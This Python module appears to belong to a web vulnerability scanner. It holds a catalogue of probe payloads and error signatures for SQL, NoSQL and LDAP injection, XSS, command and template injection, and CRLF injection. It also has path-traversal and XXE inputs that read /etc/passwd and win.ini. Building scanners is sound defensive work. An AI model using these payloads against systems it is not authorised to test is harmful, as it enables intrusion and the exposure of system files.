"""Proof-first payload catalogue and detection signatures.

Every active probe either produces a unique runtime marker or relies on a
high-specificity error/response signature. Payloads are read-only and avoid
destructive verbs; controls are checked by the calling tests before reporting.
"""

from __future__ import annotations

import base64
import difflib
import random
import re
import secrets
from dataclasses import dataclass

# --------------------------------------------------------------------- helpers
def make_token(length: int = 6) -> str:
    return secrets.token_hex(max(3, length // 2)).upper()[:length]


def _rand_pair() -> tuple[int, int, int]:
    a = random.randint(211, 977)
    b = random.randint(211, 977)
    return a, b, a * b


def similarity(left: str, right: str, limit: int = 6000) -> float:
    left_norm = " ".join((left or "")[:limit].split())
    right_norm = " ".join((right or "")[:limit].split())
    if not left_norm and not right_norm:
        return 1.0
    if not left_norm or not right_norm:
        return 0.0
    return difflib.SequenceMatcher(None, left_norm, right_norm, autojunk=False).quick_ratio()


def contains_unencoded(text: str, payload: str) -> bool:
    if not text or not payload:
        return False
    if payload in text:
        return True
    compact_payload = re.sub(r"\s+", "", payload)
    compact_text = re.sub(r"\s+", "", text)
    return compact_payload in compact_text


@dataclass(frozen=True)
class Probe:
    name: str
    payload: str
    expected: str = ""


# ------------------------------------------------------------------------ SQLi
SQL_ERROR_SIGNATURES: tuple[tuple[str, re.Pattern[str]], ...] = tuple(
    (name, re.compile(pattern, re.I | re.S))
    for name, pattern in (
        ("MySQL syntax error", r"SQL syntax.{0,80}MySQL"),
        ("MySQL warning", r"Warning.{0,40}\bmysqli?_\w+\(\)"),
        ("MySQL manual reference", r"check the manual that corresponds to your (?:MySQL|MariaDB) server"),
        ("MySQLi exception", r"MySqlException|mysqli_sql_exception"),
        ("MySQL result error", r"valid MySQL result"),
        ("PostgreSQL error", r"PostgreSQL.{0,80}ERROR"),
        ("pg_query error", r"pg_query\(\)|pg_exec\(\)"),
        ("SQLite error", r"SQLite3?::(?:Error|Exception)|sqlite3\.OperationalError|SQLite error"),
        ("Oracle ORA error", r"\bORA-\d{4,5}\b"),
        ("Oracle driver error", r"Oracle error|ORA-00933|ORA-01756"),
        ("MSSQL OLE DB error", r"Microsoft OLE DB Provider for SQL Server"),
        ("MSSQL unclosed quote", r"Unclosed quotation mark after the character string"),
        ("MSSQL syntax error", r"Incorrect syntax near|Line \d+: Incorrect syntax"),
        ("ODBC SQL Server", r"ODBC SQL Server Driver|SQLServer JDBC Driver"),
        ("SQLSTATE", r"SQLSTATE\[\w+\]"),
        ("JDBC SQL exception", r"java\.sql\.SQLException"),
        ("Hibernate error", r"org\.hibernate\.(?:exception|QueryException|SQLGrammarException)"),
        ("MyBatis error", r"org\.apache\.ibatis|MyBatis.*?Exception"),
        ("PostgreSQL PSQLException", r"PSQLException"),
        ("DB2 SQL error", r"DB2 SQL error|SQLCODE=-?\d+"),
        ("Sequelize error", r"SequelizeDatabaseError"),
        ("SQL command error", r"SQL command not properly ended|quoted string not properly terminated"),
        ("syntax error near", r"syntax error at or near"),
    )
)

SQL_ERROR_SUFFIXES = [
    ("single quote", "'"),
    ("double quote", '"'),
    ("quote + paren", "')"),
    ("backslash", "\\"),
    ("quote + semicolon", "';"),
]

SQL_ERROR_SUFFIXES_DEEP = SQL_ERROR_SUFFIXES + [
    ("numeric quote", " AND 1=1"),
    ("quote + comment", "'-- -"),
    ("double quote + comment", '"-- -'),
]

SQL_BOOLEAN_PAIRS = [
    ("single quote", "' AND '1'='1", "' AND '1'='2"),
    ("double quote", '" AND "1"="1', '" AND "1"="2'),
    ("quote + paren", "') AND ('1'='1", "') AND ('1'='2"),
    ("numeric", " AND 1=1", " AND 1=2"),
]

SQL_TIME_PROBES = [
    ("MySQL SLEEP", "' AND SLEEP(3)-- -", 3.0),
    ("PostgreSQL pg_sleep", "';SELECT pg_sleep(3)-- -", 3.0),
    ("MSSQL WAITFOR", "';WAITFOR DELAY '0:0:3'-- -", 3.0),
    ("SQLite heavy query", "' AND 1=(SELECT COUNT(*) FROM sqlite_master AS a, sqlite_master AS b, sqlite_master AS c)-- -", 0.0),
]


def find_sql_error(text: str, baseline: str = "") -> str:
    haystack = (text or "")[:600000]
    for name, pattern in SQL_ERROR_SIGNATURES:
        if pattern.search(haystack):
            if baseline and pattern.search(baseline):
                continue
            return name
    return ""


# ------------------------------------------------------------------------- XSS
def xss_payloads(token: str, deep: bool = False) -> list[Probe]:
    probes = [
        Probe("double-quote SVG", f'"><svg/onload=alert("{token}")>'),
        Probe("single-quote script", f"'><script>alert('{token}')</script>"),
    ]
    if deep:
        probes.extend(
            [
                Probe("double-quote IMG", f'"><img src=x onerror=alert("{token}")>'),
                Probe("body script", f'<script>alert("{token}")</script>'),
                Probe("attribute toggle", f'"><details/open/ontoggle=alert("{token}")>'),
                Probe("anchor JavaScript URI", f"javascript:alert('{token}')//"),
            ]
        )
    return probes


def xss_reflected(text: str, payload: str) -> bool:
    if not text:
        return False
    if contains_unencoded(text, payload):
        return True
    # Attribute-quote normalization can split the exact payload; require the
    # surrounding markup to still be live (HTML-encoded output must not match).
    token_match = re.search(r"alert\(['\"]?([A-Z0-9]{6,})", payload)
    if token_match:
        token = token_match.group(1)
        for match in re.finditer(re.escape(token), text):
            window = text[max(0, match.start() - 80) : match.start() + 80].lower()
            if any(tag in window for tag in ("<svg", "<script", "<img", "<details")):
                return True
    return False


# ------------------------------------------------------------------ command inj
def command_payloads(token: str, deep: bool = False) -> list[Probe]:
    a, b, product = _rand_pair()
    marker = f"AGCMD{token}"
    expected = f"{marker}{product}"
    probes = [
        Probe("semicolon echo", f"; echo {marker}$(({a}*{b}));", expected),
        Probe("pipe echo", f"| echo {marker}$(({a}*{b}))", expected),
        Probe("logical AND echo", f"&& echo {marker}$(({a}*{b}))", expected),
        Probe("command substitution", f"`echo {marker}$(({a}*{b}))`", expected),
        Probe("newline echo", f"\n echo {marker}$(({a}*{b}))", expected),
        Probe("Windows COMSPEC expansion", f"& echo {marker}%COMSPEC:~-3%", f"{marker}exe"),
    ]
    if deep:
        probes.extend(
            [
                Probe("dollar substitution", f"$(echo {marker}$(({a}*{b})))", expected),
                Probe("Windows set arithmetic", f"& set /a {a}*{b}", str(product)),
                Probe("Windows pipe echo", f"| echo {marker}%COMSPEC:~-3%", f"{marker}exe"),
            ]
        )
    return probes


# ------------------------------------------------------------------------ SSTI
SSTI_TEMPLATES = [
    ("Jinja/Twig", "{{%d*%d}}"),
    ("JSP EL", "${%d*%d}"),
    ("ERB/EJS", "<%%= %d*%d %%>"),
    ("Ruby interpolation", "#{%d*%d}"),
    ("Thymeleaf/Spring", "*{%d*%d}"),
    ("Razor", "@(%d*%d)"),
    ("Freemarker", "${%d*%d}"),
]


def ssti_payloads(deep: bool = False) -> list[Probe]:
    a, b, _ = _rand_pair()
    product = str(a * b)
    probes = [Probe(name, template % (a, b), product) for name, template in SSTI_TEMPLATES[:3]]
    if deep:
        probes = [Probe(name, template % (a, b), product) for name, template in SSTI_TEMPLATES]
    # Duplicate-name Freemarker entry is intentional: different engines, same syntax.
    return probes


# -------------------------------------------------------------------- traversal
LFI_SIGNATURES = (
    "root:x:0:0:",
    "root:*:0:0:",
    "daemon:x:1:1:",
    "for 16-bit app support",
    "[fonts]",
    "[extensions]",
    "[mci extensions]",
)

LFI_PAYLOADS = [
    ("Linux relative traversal", "../../../../../../etc/passwd"),
    ("Linux nested traversal", "....//....//....//....//....//etc/passwd"),
    ("Linux absolute path", "/etc/passwd"),
    ("Windows relative traversal", "..\\..\\..\\..\\..\\..\\Windows\\win.ini"),
    ("Windows absolute path", "C:\\Windows\\win.ini"),
]

LFI_PAYLOADS_DEEP = LFI_PAYLOADS + [
    ("Encoded traversal", "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"),
    ("Traversal with null byte", "../../../../../../etc/passwd%00"),
]


def lfi_evidence(text: str, baseline: str = "") -> str:
    if not text:
        return ""
    for signature in LFI_SIGNATURES:
        if signature in text and (not baseline or signature not in baseline):
            return signature
    return ""


# ------------------------------------------------------------------------ XXE
XXE_PAYLOADS = [
    (
        "Linux passwd entity",
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE aegis [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<aegis>&xxe;</aegis>""",
    ),
    (
        "Windows win.ini entity",
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE aegis [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>
<aegis>&xxe;</aegis>""",
    ),
]

XXE_SIGNATURES = LFI_SIGNATURES


def xxe_evidence(text: str, baseline: str = "") -> str:
    return lfi_evidence(text, baseline)


# --------------------------------------------------------------------- NoSQL
NOSQL_SIGNATURES: tuple[tuple[str, re.Pattern[str]], ...] = tuple(
    (name, re.compile(pattern, re.I | re.S))
    for name, pattern in (
        ("MongoDB driver error", r"MongoError|MongoServerError|MongoParseError"),
        ("MongoDB cast error", r"CastError|Cast to ObjectId failed|Cannot cast"),
        ("BSON parse error", r"BSONTypeError|BSONError|bson\.errors"),
        ("Mongoose validation", r"MongooseError|ValidationError: Cast"),
        ("NoSQL syntax error", r"unknown operator|bad query|not a valid ObjectId"),
    )
)

NOSQL_VALUES = [
    ("bracket operator", "'[$ne]=1"),
    ("JSON operator", '\'{"$ne":null}\''),
    ("operator object", "' {\"$gt\":\"\"}"),
    ("quote break", "'"),
]


def find_nosql_error(text: str, baseline: str = "") -> str:
    haystack = (text or "")[:400000]
    for name, pattern in NOSQL_SIGNATURES:
        if pattern.search(haystack) and not (baseline and pattern.search(baseline)):
            return name
    return ""


# ---------------------------------------------------------------------- LDAP
LDAP_SIGNATURES: tuple[tuple[str, re.Pattern[str]], ...] = tuple(
    (name, re.compile(pattern, re.I | re.S))
    for name, pattern in (
        ("Java LDAP exception", r"javax\.naming\.(?:directory\.)?(?:InvalidSearchFilterException|NamingException)"),
        ("LDAP error", r"LDAPException|LDAP error|LDAP result code"),
        ("Invalid DN", r"Invalid DN syntax|invalid DN|malformed filter"),
        ("Protocol error", r"protocol error.*?LDAP|LDAP.*?protocol error"),
        ("OpenLDAP error", r"ldap_search|ldap_bind|OpenLDAP"),
    )
)

LDAP_VALUES = [
    ("wildcard auth bypass", "*)(uid=*))(|(uid=*"),
    ("objectClass filter", "*)(objectClass=*"),
    ("filter break", ")(|(cn=*"),
]


def find_ldap_error(text: str, baseline: str = "") -> str:
    haystack = (text or "")[:400000]
    for name, pattern in LDAP_SIGNATURES:
        if pattern.search(haystack) and not (baseline and pattern.search(baseline)):
            return name
    return ""


# ----------------------------------------------------------------------- CRLF
CRLF_HEADER = "Aegis-Probe-{token}"


def crlf_payload(token: str) -> tuple[str, str]:
    header = CRLF_HEADER.format(token=token)
    return f"\r\n{header}: hit", header.lower()


# --------------------------------------------------------------- open redirect
REDIRECT_PARAM_RE = re.compile(
    r"^(?:url|uri|redirect|redirect_uri|redirect_url|next|return|returnurl|return_url|"
    r"continue|dest|destination|target|to|link|goto|callback|r|u)$",
    re.I,
)


def redirect_payload(token: str) -> str:
    return f"https://example.org/aegis-{token.lower()}"


# --------------------------------------------------------------- host header
def host_probe(token: str) -> str:
    return f"aegis-{token.lower()}.invalid"


# ------------------------------------------------------------------- GraphQL
GRAPHQL_QUERY = '{"query":"query AegisProbe { __schema { queryType { name } } }"}'


# --------------------------------------------------------------------- misc
def b64_contains(text: str, needle: str) -> bool:
    """Used by checks looking for encoded file-read evidence."""
    try:
        decoded = base64.b64decode(text, validate=False)
    except Exception:
        return False
    return needle.encode() in decoded


__all__ = [
    "make_token",
    "similarity",
    "contains_unencoded",
    "Probe",
    "find_sql_error",
    "SQL_ERROR_SUFFIXES",
    "SQL_ERROR_SUFFIXES_DEEP",
    "SQL_BOOLEAN_PAIRS",
    "SQL_TIME_PROBES",
    "xss_payloads",
    "xss_reflected",
    "command_payloads",
    "ssti_payloads",
    "LFI_SIGNATURES",
    "LFI_PAYLOADS",
    "LFI_PAYLOADS_DEEP",
    "lfi_evidence",
    "XXE_PAYLOADS",
    "XXE_SIGNATURES",
    "xxe_evidence",
    "NOSQL_VALUES",
    "find_nosql_error",
    "LDAP_VALUES",
    "find_ldap_error",
    "crlf_payload",
    "REDIRECT_PARAM_RE",
    "redirect_payload",
    "host_probe",
    "GRAPHQL_QUERY",
]
